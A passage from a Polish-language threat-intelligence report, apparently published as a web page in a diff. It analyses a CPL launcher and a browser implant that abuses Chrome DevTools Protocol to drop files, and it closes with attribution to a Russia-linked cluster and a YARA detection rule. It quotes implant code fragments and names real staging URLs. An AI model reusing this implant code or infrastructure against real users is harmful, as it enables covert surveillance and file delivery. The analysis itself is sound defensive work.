+<span class="line"><span style="color:#9ECBFF">                    a.style.display = 'none';</span></span>
+<span class="line"><span style="color:#9ECBFF">                    document.body.appendChild(a);</span></span>
+<span class="line"><span style="color:#9ECBFF">                    a.click();</span></span>
+<span class="line"><span style="color:#9ECBFF">                    document.body.removeChild(a);</span></span>
+<span class="line"><span style="color:#9ECBFF">                    return 'OK';</span></span>
+<span class="line"><span style="color:#9ECBFF">                } catch (e) {</span></span>
+<span class="line"><span style="color:#9ECBFF">                    return 'ERR: ' + e.message;</span></span>
+<span class="line"><span style="color:#9ECBFF">                }</span></span>
+<span class="line"><span style="color:#9ECBFF">            })();`</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            returnByValue: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            awaitPromise: </span><span style="color:#79B8FF">false</span></span>
+<span class="line"><span style="color:#E1E4E8">        }, sessionId);</span></span>
+<span class="line"><span style="color:#79B8FF">        this</span><span style="color:#E1E4E8">.ws.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">({ type: </span><span style="color:#9ECBFF">'file_upload_success'</span><span style="color:#E1E4E8">, message: </span><span style="color:#9ECBFF">'File download started'</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">catch</span><span style="color:#E1E4E8"> (err) {</span></span>
+<span class="line"><span style="color:#79B8FF">        this</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">#sendError</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Upload failed: '</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> err.message);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>W pierwszym kroku ścieżka docelowa jest normalizowana do formatu charakterystycznego dla systemu Windows. Następnie próbka nawiązuje połączenie z lokalnym interfejsem debugowym Chrome/Chromium, odwołując się do endpointu <code>http://127.0.0.1:9222/json/version</code> przy użyciu klasy <code>CDPClient</code>. Z odpowiedzi pobierany jest adres <code>webSocketDebuggerUrl</code>, który służy do zestawienia sesji z Chrome DevTools Protocol.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">static async </span><span style="color:#B392F0">connect</span><span style="color:#E1E4E8">(host </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '127.0.0.1'</span><span style="color:#E1E4E8">, port </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 9222</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> response</span><span style="color:#F97583"> =</span><span style="color:#F97583"> await</span><span style="color:#B392F0"> fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'http://'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> host </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> ':'</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> port </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> '/json/version'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">response.ok) </span><span style="color:#F97583">throw</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> Error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Cannot fetch /json/version: '</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> response.status);</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#E1E4E8"> { </span><span style="color:#79B8FF">webSocketDebuggerUrl</span><span style="color:#E1E4E8"> } </span><span style="color:#F97583">=</span><span style="color:#F97583"> await</span><span style="color:#E1E4E8"> response.</span><span style="color:#B392F0">json</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">    const</span><span style="color:#79B8FF"> socket</span><span style="color:#F97583"> =</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> WebSocket</span><span style="color:#E1E4E8">(webSocketDebuggerUrl);</span></span>
+<span class="line"><span style="color:#F97583">    await</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> Promise</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">resolve</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">reject</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">        socket.</span><span style="color:#B392F0">addEventListener</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'open'</span><span style="color:#E1E4E8">, resolve, { once: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#E1E4E8">        socket.</span><span style="color:#B392F0">addEventListener</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'error'</span><span style="color:#E1E4E8">, reject, { once: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8"> });</span></span>
+<span class="line"><span style="color:#E1E4E8">    });</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Po uzyskaniu połączenia wykonywane jest polecenie <code>Browser.setDownloadBehavior</code>, za pomocą którego ustawiany jest katalog pobierania wskazany w parametrze <code>path</code>. Następnie klient pobiera listę aktywnych targetów przeglądarki, wybiera target typu <code>page</code> i dołącza się do niego przy użyciu <code>Target.attachToTarget</code>. W dalszej kolejności włączany jest moduł <code>Runtime</code>, a do kontekstu strony wstrzykiwany jest kod JavaScript tworzący ukryty element <code>&#x3C;a></code>, ustawiający jego <code>href</code> na wskazany URL i wymuszający kliknięcie.<br>
+Taki mechanizm powoduje, że przeglądarka inicjuje pobranie pliku i zapisuje go do wcześniej ustawionego katalogu lokalnego. Należy podkreślić, że wysyłany po tej operacji komunikat <code>file_upload_success</code> nie stanowi potwierdzenia faktycznego zakończenia pobierania ani poprawnego zapisu pliku, lecz jedynie informację o uruchomieniu procedury pobrania.</p>
+<h2 id="podsumowanie">Podsumowanie</h2>
+<p>Analizowany wariant CPL pełni rolę natywnego launchera, który przygotowuje środowisko dla właściwego, przeglądarkowego etapu infekcji. W praktyce tworzy on lokalny plik <code>.htm</code> w katalogu <code>%TEMP%</code>, odzyskuje z zaszyfrowanych bloków danych kluczowe stringi i payload HTML przy użyciu prostego mechanizmu XOR, sprawdza obecność Microsoft Edge przez właściwy klucz w rejestrze, a następnie uruchamia Edge lub Chrome z zestawem parametrów osłabiających standardowe mechanizmy bezpieczeństwa Chromium. Lokalny HTML jest loaderem pobierającym zdalny JavaScript, który przejmuje właściwą logikę działania i udostępnia operatorowi funkcje związane z przechwytywaniem ekranu, obrazu z kamery, dźwięku z mikrofonu, dostępem do lokalnych plików oraz możliwością dosyłania plików przez Chrome DevTools Protocol.</p>
+<h2 id="atrybucja">Atrybucja</h2>
+<p>Analizując powyższą próbkę można zauważyć pewne istotne podobieństwa architektoniczne do malware PLUGGYAPE atrybuowanego przez <a href="https://cert.gov.ua/article/6286942">CERT-UA</a> do UAC-0190 aka Laundry Bear / Void Blizzard.<br>
+W obu przypadkach zaobserwowano m. in. wykorzystanie zewnętrznego źródła konfiguracji C2 i dostarczenia właściwego ładunku, mechanizmu trwałej identyfikacji ofiary, utrzymywania stałego kanału komunikacyjnego z serwerem. Jednocześnie próbki różnią się kontekstem wykonania, warstwą transportową oraz zakresem mechanizmów stealth i persystencji. Ponadto wziąć pod uwagę dodatkowe argumenty tj. podobieństwo lure opisane w artylule <a href="https://lab52.io/blog/drillapp-new-backdoor-targeting-ukrainian-entities-with-possible-links-to-laundry-bear/">LAB52</a>. Zwarzając na powyższe należy łączyć powyższą aktywność ze średnim prawdopodobieństwem do wspoknianego klastra.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Obszar podobieństwa</th><th>Komentarz analityczny</th></tr></thead><tbody><tr><td>Pozyskanie konfiguracji C2</td><td>W obu przypadkach finalny adres serwera C2 nie jest osadzony jawnie w kodzie, lecz pobierany z zewnętrznych serwisów służących do przechowywania i udostępniania danych.</td></tr><tr><td>Pozyskanie właściwego ładunku</td><td>W obu przypadkach właściwy etap wykonywalny lub konfiguracyjny jest pobierany z infrastruktury pośredniej, a nie osadzony bezpośrednio jako jawny payload pierwszego etapu.</td></tr><tr><td>Identyfikacja ofiary</td><td>Obie próbki wykorzystują stabilny identyfikator klienta, który umożliwia rejestrację ofiary i korelację kolejnych sesji po stronie operatora.</td></tr><tr><td>Rejestracja klienta</td><td>Po zestawieniu połączenia obie próbki przekazują do serwera zestaw danych identyfikujących ofiarę lub środowisko wykonania.</td></tr><tr><td>Fallback do localhost</td><td>W obu przypadkach występuje mechanizm awaryjny odwołujący się do localhost, co może wskazywać na tryb testowy, środowisko developerskie.</td></tr><tr><td>Kanał komunikacyjny</td><td>Obie próbki wykorzystują trwały kanał komunikacyjny o charakterze sesyjnym, umożliwiający dwukierunkową wymianę poleceń i danych z serwerem operatora.</td></tr><tr><td>Mechanizm heartbeat</td><td>W obu implementacjach występuje mechanizm heartbeat, służący do podtrzymywania aktywnej sesji i monitorowania dostępności klienta.</td></tr></tbody></table> </article> </section> <section class="tab-panel" id="yara-panel" role="tabpanel" aria-labelledby="yara-tab" data-tab-panel="yara" hidden data-astro-cid-hyntgva6> <div class="report-yara" data-astro-cid-hyntgva6> <div class="yara-head" data-astro-cid-hyntgva6> <h2 data-astro-cid-hyntgva6>Detection rules</h2> </div> <div class="yara-grid" data-astro-cid-hyntgva6> <article class="yara-rule" data-astro-cid-hyntgva6> <div class="yara-rule-head" data-astro-cid-hyntgva6> <h3 data-astro-cid-hyntgva6>streamerapp_browser_implant_delivery</h3> <p data-astro-cid-hyntgva6>Reguła wykrywająca artefakty związane z launcherem CPL i przeglądarkowym implantem StreamerApp.</p> </div> <pre class="astro-code shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#E1E4E8">rule streamerapp_browser_implant_delivery {</span></span>
+<span class="line"><span style="color:#B392F0">  meta</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">    author </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "irondefence"</span></span>
+<span class="line"><span style="color:#E1E4E8">    description </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "Detects StreamerApp browser implant delivery and execution artifacts"</span></span>
+<span class="line"><span style="color:#E1E4E8">    date </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "2026-03-15"</span></span>
+<span class="line"><span style="color:#E1E4E8">    tlp </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "clear"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">  strings</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">    $pastefy </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "pastefy.app/B9LUfqZh/raw"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"><span style="color:#E1E4E8">    $lnkua </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "lnk.ua/lZRJggrBK"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"><span style="color:#E1E4E8">    $debug </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "http://127.0.0.1:9222/json/version"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"><span style="color:#E1E4E8">    $edge </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "SOFTWARE</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">Microsoft</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">Windows</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">CurrentVersion</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">App Paths</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">msedge.exe"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"><span style="color:#E1E4E8">    $headless </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "--headless=new"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"><span style="color:#E1E4E8">    $ws </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "webSocketDebuggerUrl"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"><span style="color:#E1E4E8">    $download </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "Browser.setDownloadBehavior"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"><span style="color:#E1E4E8">    $target </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "Target.attachToTarget"</span><span style="color:#E1E4E8"> ascii wide</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">  condition</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">    4</span><span style="color:#F97583"> of</span><span style="color:#E1E4E8"> them</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre> </article> </div> </div> </section> </section> </div> <aside class="report-toc" aria-label="Page contents" data-astro-cid-hyntgva6> <div class="report-toc-inner" data-astro-cid-hyntgva6> <p class="report-toc-title" data-astro-cid-hyntgva6>Page contents</p> <nav class="report-toc-nav" data-astro-cid-hyntgva6> <span class="report-toc-rail" aria-hidden="true" data-astro-cid-hyntgva6> <span class="report-toc-indicator" data-toc-indicator data-astro-cid-hyntgva6></span> </span> <a class="report-toc-link" href="#od-apletu-panelu-sterowania-do-browser-based-implant" data-toc-link="od-apletu-panelu-sterowania-do-browser-based-implant" data-astro-cid-hyntgva6> Od apletu Panelu sterowania do browser-based implant </a><a class="report-toc-link depth-3" href="#wybór-edge-i-fallback-do-chrome" data-toc-link="wybór-edge-i-fallback-do-chrome" data-astro-cid-hyntgva6> Wybór Edge i fallback do Chrome </a><a class="report-toc-link depth-3" href="#budowa-komendy-i-znaczenie-parametrów-uruchomieniowych" data-toc-link="budowa-komendy-i-znaczenie-parametrów-uruchomieniowych" data-astro-cid-hyntgva6> Budowa komendy i znaczenie parametrów uruchomieniowych </a><a class="report-toc-link depth-3" href="#potem-przeglądarka-przestaje-zachowywać-się-jak-przeglądarka" data-toc-link="potem-przeglądarka-przestaje-zachowywać-się-jak-przeglądarka" data-astro-cid-hyntgva6> Potem przeglądarka przestaje zachowywać się jak przeglądarka </a><a class="report-toc-link depth-3" href="#dalsza-część-analizy-został-zrealizowana-na-podstawie-kodu-po-refaktoryzacji-w-zakresie-nazewnctwa-zmiennych" data-toc-link="dalsza-część-analizy-został-zrealizowana-na-podstawie-kodu-po-refaktoryzacji-w-zakresie-nazewnctwa-zmiennych" data-astro-cid-hyntgva6> Dalsza część analizy został zrealizowana na podstawie kodu po refaktoryzacji, w zakresie nazewnctwa zmiennych. </a><a class="report-toc-link depth-3" href="#wykorzystywane-polecenia-c2" data-toc-link="wykorzystywane-polecenia-c2" data-astro-cid-hyntgva6> Wykorzystywane polecenia C2 </a><a class="report-toc-link depth-3" href="#wykorzystywane-typy-komunikatów-wysyłanych-przez-klienta" data-toc-link="wykorzystywane-typy-komunikatów-wysyłanych-przez-klienta" data-astro-cid-hyntgva6> Wykorzystywane typy komunikatów wysyłanych przez klienta </a><a class="report-toc-link depth-3" href="#liczy-się-wnętrze--ciekawe-implementacje-wybranych-modułów" data-toc-link="liczy-się-wnętrze--ciekawe-implementacje-wybranych-modułów" data-astro-cid-hyntgva6> Liczy się wnętrze — ciekawe implementacje wybranych modułów. </a><a class="report-toc-link" href="#podsumowanie" data-toc-link="podsumowanie" data-astro-cid-hyntgva6> Podsumowanie </a><a class="report-toc-link" href="#atrybucja" data-toc-link="atrybucja" data-astro-cid-hyntgva6> Atrybucja </a> </nav> </div> </aside> </div> <script>
+      const tabsRoot = document.querySelector("[data-report-tabs]");
+      const reportShell = document.querySelector("[data-report-shell]");
+
+      if (tabsRoot instanceof HTMLElement) {
+        const triggers = tabsRoot.querySelectorAll("[data-tab-trigger]");
+        const panels = tabsRoot.querySelectorAll("[data-tab-panel]");
+
+        const setActiveTab = (tab) => {
+          tabsRoot.dataset.activeTab = tab;
+          if (reportShell instanceof HTMLElement) {
+            reportShell.dataset.activeTab = tab;
+          }
+
+          for (const trigger of triggers) {
+            const active = trigger.getAttribute("data-tab-trigger") === tab;
+            trigger.classList.toggle("active", active);
+            trigger.setAttribute("aria-selected", active ? "true" : "false");
+          }
+
+          for (const panel of panels) {
+            const active = panel.getAttribute("data-tab-panel") === tab;
+            panel.toggleAttribute("hidden", !active);
+            panel.classList.toggle("active", active);
+          }
+        };
+
+        for (const trigger of triggers) {
+          trigger.addEventListener("click", () => {
+            const tab = trigger.getAttribute("data-tab-trigger");
+            if (tab) {
+              setActiveTab(tab);
+            }
+          });
+        }
+      }
+    </script><script>
+    const reportSidebar = document.querySelector("[data-report-sidebar]");
+    const reportSidebarToggle = document.querySelector("[data-report-sidebar-toggle]");
+
+    if (reportSidebar instanceof HTMLElement && reportSidebarToggle instanceof HTMLButtonElement) {
+      reportSidebarToggle.addEventListener("click", () => {
+        const collapsed = reportSidebar.dataset.collapsed === "true";
+        reportSidebar.dataset.collapsed = collapsed ? "false" : "true";
+        reportSidebarToggle.setAttribute("aria-expanded", collapsed ? "true" : "false");
+      });
+    }
+  </script>  </main> <span class="snippet-copy-template" hidden data-copy-label="Copy" data-copied-label="Copied"> <svg width="1em" height="1em" class="snippet-copy-icon" data-icon="lucide:copy">   <symbol id="ai:lucide:copy" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></g></symbol><use href="#ai:lucide:copy"></use>  </svg> </span> <script>
+    const tocLinks = Array.from(document.querySelectorAll("[data-toc-link]"));
+    const tocIndicator = document.querySelector("[data-toc-indicator]");
+    const tocReportShell = document.querySelector("[data-report-shell]");
+    const observedHeadings = tocLinks
+      .map((link) => {
+        if (!(link instanceof HTMLAnchorElement)) {
+          return null;
+        }
+
+        const slug = link.dataset.tocLink;
+        if (!slug) {
+          return null;
+        }
+
+        const heading = document.getElementById(slug);
+        if (!heading) {
+          return null;
+        }
+
+        return { link, heading };
+      })
+      .filter(Boolean);
+
+    if (observedHeadings.length > 0) {
+      const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+      const getActiveTab = () =>
+        tocReportShell?.getAttribute("data-active-tab") ?? "report";
+
+      const setActiveLinks = (visibleIds, currentId) => {
+        for (const item of observedHeadings) {
+          const isVisible = visibleIds.has(item.heading.id);
+          const isCurrent = item.heading.id === currentId;
+          item.link.classList.toggle("active", isVisible);
+          item.link.classList.toggle("current", isCurrent);
+        }
+      };
+
+      const hideIndicator = () => {
+        if (tocIndicator instanceof HTMLElement) {
+          tocIndicator.style.opacity = "0";
+        }
+      };
+
+      const setIndicatorRange = (startIndex, endIndex) => {
+        if (!(tocIndicator instanceof HTMLElement)) {
+          return;
+        }
+
+        if (getActiveTab() === "yara") {
+          hideIndicator();
+          return;
+        }
+
+        const start = observedHeadings[startIndex];
+        const end = observedHeadings[endIndex];
+        const nav = tocIndicator.closest(".report-toc-nav");
+
+        if (!start || !end || !(nav instanceof HTMLElement)) {
+          hideIndicator();
+          return;
+        }
+
+        const navRect = nav.getBoundingClientRect();
+        const startRect = start.link.getBoundingClientRect();
+        const endRect = end.link.getBoundingClientRect();
+        const top = startRect.top - navRect.top + 1;
+        const bottom = endRect.bottom - navRect.top - 1;
+
+        tocIndicator.style.opacity = "1";
+        tocIndicator.style.transform = `translateY(${top}px)`;
+        tocIndicator.style.height = `${Math.max(bottom - top, start.link.offsetHeight)}px`;
+      };
+
+      const getOffset = () => {
+        const raw = getComputedStyle(document.documentElement)
+          .getPropertyValue("--report-anchor-offset")
+          .trim();
+        const parsed = Number.parseFloat(raw);
+        return Number.isFinite(parsed) ? parsed * 16 : 118;
+      };
+
+      const updateActiveLink = () => {
+        if (getActiveTab() === "yara") {
+          hideIndicator();
+          return;
+        }
+
+        const offset = getOffset() + 20;
+        const viewportStart = window.scrollY + offset;
+        const viewportEnd = window.scrollY + window.innerHeight - 24;
+        let activeIndex = 0;
+        const visibleIndices = [];
+
+        for (const [index, item] of observedHeadings.entries()) {
+          const sectionStart = window.scrollY + item.heading.getBoundingClientRect().top;
+          const nextHeading = observedHeadings[index + 1]?.heading;
+          const sectionEnd = nextHeading
+            ? window.scrollY + nextHeading.getBoundingClientRect().top
+            : document.documentElement.scrollHeight;
+
+          if (sectionStart <= viewportStart) {
+            activeIndex = index;
+          }
+
+          if (sectionEnd > viewportStart && sectionStart < viewportEnd) {
+            visibleIndices.push(index);
+          }
+        }
+
+        const activeId = observedHeadings[activeIndex]?.heading.id;
+        const effectiveVisibleIndices = visibleIndices.length > 0 ? visibleIndices : [activeIndex];
+        const visibleIds = new Set(
+          effectiveVisibleIndices
+            .map((index) => observedHeadings[index]?.heading.id)
+            .filter(Boolean),
+        );
+
+        if (activeId) {
+          setActiveLinks(visibleIds, activeId);
+          setIndicatorRange(
+            effectiveVisibleIndices[0] ?? activeIndex,
+            effectiveVisibleIndices[effectiveVisibleIndices.length - 1] ?? activeIndex,
+          );
+        }
+      };
+
+      for (const item of observedHeadings) {
+        item.link.addEventListener("click", (event) => {
+          event.preventDefault();
+
+          const top = window.scrollY + item.heading.getBoundingClientRect().top - getOffset();
+
+          window.scrollTo({
+            top,
+            behavior: prefersReducedMotion ? "auto" : "smooth",
+          });
+
+          window.history.replaceState(null, "", `#${item.heading.id}`);
+        });
+      }
+
+      const onScroll = () => {
+        window.requestAnimationFrame(updateActiveLink);
+      };
+
+      updateActiveLink();
+      window.addEventListener("scroll", onScroll, { passive: true });
+      window.addEventListener("resize", updateActiveLink);
+
+      if (tocReportShell instanceof HTMLElement) {
+        const observer = new MutationObserver(() => {
+          window.requestAnimationFrame(updateActiveLink);
+        });
+
+        observer.observe(tocReportShell, {
+          attributes: true,
+          attributeFilter: ["data-active-tab"],
+        });
+      }
+    } else if (tocIndicator instanceof HTMLElement) {
+      tocIndicator.style.opacity = "0";
+    }
+
+    const snippetTemplate = document.querySelector(".snippet-copy-template");
+    const proseRoots = document.querySelectorAll(".report-prose");
+
+    for (const root of proseRoots) {
+      const mediaBlocks = root.querySelectorAll("p > img, figure, table");
+
+      for (const media of mediaBlocks) {
+        const block =
+          media instanceof HTMLElement && media.tagName === "IMG"
+            ? media.closest("p")
+            : media;
+
+        if (!(block instanceof HTMLElement)) {
+          continue;
+        }
+
+        block.classList.add("media-block");
+
+        const next = block.nextElementSibling;
+
+        if (
+          next instanceof HTMLParagraphElement &&
+          next.childElementCount === 1 &&
+          ["EM", "STRONG"].includes(next.firstElementChild?.tagName ?? "")
+        ) {
+          next.classList.add("media-caption");
+        }
+      }
+    }
+
+    if (snippetTemplate instanceof HTMLElement) {
+      const copyText = snippetTemplate.dataset.copyLabel ?? "Copy";
+      const copiedText = snippetTemplate.dataset.copiedLabel ?? "Copied";
+      const copyIcon = snippetTemplate.innerHTML;
+      const codeBlocks = document.querySelectorAll(".report-tabs-shell pre.astro-code, .report-prose pre.astro-code");
+
+      for (const block of codeBlocks) {
+        if (!(block instanceof HTMLElement) || block.parentElement?.classList.contains("code-frame")) {
+          continue;
+        }
+
+        const wrapper = document.createElement("div");
+        wrapper.className = "code-frame";
+
+        const toolbar = document.createElement("div");
+        toolbar.className = "code-toolbar";
+
+        const language = document.createElement("span");
+        language.className = "code-language";
+        const languageLabel =
+          block.closest(".yara-rule") instanceof HTMLElement
+            ? "YARA"
+            : (block.dataset.language ?? "text").toUpperCase();
+        language.textContent = languageLabel;
+
+        const button = document.createElement("button");
+        button.type = "button";
+        button.className = "snippet-copy";
+        button.setAttribute("aria-label", copyText);
+        button.innerHTML = `${copyIcon}<span>${copyText}</span>`;
+
+        button.addEventListener("click", async () => {
+          const content = block.querySelector("code")?.textContent ?? block.textContent ?? "";
+
+          try {
+            await navigator.clipboard.writeText(content);
+            button.classList.add("copied");
+            button.setAttribute("aria-label", copiedText);
+
+            const label = button.querySelector("span");
+            if (label) {
+              label.textContent = copiedText;
+            }
+
+            window.setTimeout(() => {
+              button.classList.remove("copied");
+              button.setAttribute("aria-label", copyText);
+              if (label) {
+                label.textContent = copyText;
+              }
+            }, 1400);
+          } catch (_error) {
+            button.setAttribute("aria-label", copyText);
+          }
+        });
+
+        toolbar.append(language, button);
+        block.parentNode?.insertBefore(wrapper, block);
+        wrapper.append(toolbar, block);
+      }
+    }
+  </script>  </div>  </body></html>
